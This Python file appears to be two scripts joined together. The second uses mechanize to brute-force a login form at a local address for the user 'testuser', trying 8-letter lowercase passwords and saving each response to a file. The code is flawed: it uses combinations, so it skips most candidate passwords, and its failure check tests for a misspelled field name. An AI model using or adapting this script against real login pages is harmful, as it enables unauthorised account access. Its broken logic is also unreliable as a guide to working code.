# import required modules
from itertools import combinations

from string import ascii_lowercase

# Possible password list

passwords = (p for p in combinations(ascii_lowercase, 8))

for p in passwords:
    print(''.join(p))
import mechanize

from itertools import combinations

from string import ascii_lowercase

url = "http://127.0.0.1:5000/login"

browser = mechanize.Browser()

attackNumber = 1

# Possible password list

passwords = (p for p in combinations(ascii_lowercase, 8))

for p in passwords:
    browser.open(url)

    browser.select_form(nr=0)
    print(browser)
    browser["username"] = 'testuser'

    browser["password"] = ''.join(p)

    res = browser.submit()

    content = res.read()

    # Print  response code


    # Write response to file

    output = open('response' + str(attackNumber) + '.txt', 'w')

    output.write(content.decode('utf-8'))

    output.close()

    attackNumber += 1
    # check if we were taken back to the login page or not

    if content.find(b'<input type="password" name="passwordd" />') > 0:
        print("Login failed")
